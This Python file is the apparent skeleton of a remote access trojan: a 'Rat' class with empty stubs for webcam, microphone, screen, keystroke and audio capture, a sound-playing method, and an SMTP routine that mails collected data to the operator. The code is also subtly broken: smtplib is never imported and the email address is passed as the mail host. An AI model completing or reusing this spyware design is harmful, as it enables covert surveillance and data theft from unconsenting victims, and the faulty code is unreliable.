from contracts import contract, new_contract
from playsound import playsound


class Rat:
    def __init__(self, interval, report_method):
        self.interval = interval
        self.report_method = report_method

    def system_info(self):
        """
        """
        pass

    def webcam(self):
        """
        """
        pass

    def microphone(self):
        """
        """
        pass

    def screen(self):
        """
        """
        pass

    def keyboard(self):
        """
        """
        pass

    def audio(self):
        """
        """
        pass

    @contract
    def sound(self, path_to_mp3):  # TODO: separate method for contract path_to_mp3
        """
        This method plays a sound file

        :param path_to_mp3: path to the sound file (see example)
        :type path_to_mp3: str

        Example: *.sound(r"/home/User/Music/track.mp3")
        """
        playsound(path_to_mp3)

    def report_to_email(self, email, password, text):
        """
        """
        server = smtplib.SMTP(host=email, port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, text)
        server.quit()


def main():
    pass


if __name__ == "__main__":
    main()

